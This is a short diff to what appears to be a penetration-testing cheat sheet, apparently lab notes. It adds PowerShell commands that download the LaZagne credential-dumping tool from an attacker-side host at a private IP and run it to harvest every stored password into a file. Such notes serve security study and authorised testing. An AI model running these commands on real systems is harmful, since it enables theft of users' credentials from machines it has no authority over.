@@ -123,7 +123,10 @@ ERROR kuhl_m_sekurlsa_acquireLSA ; Logon list
 # Lazagne
 
 - [Lazagne](https://github.com/AlessandroZ/LaZagne/releases/)
-
+```powershell
+iwr -uri http://192.168.49.104:8888/LaZagne.exe -OutFile .\LaZagne.exe
+.\LaZagne.exe all -oN -output lazagne.out
+```
 
 
 ---
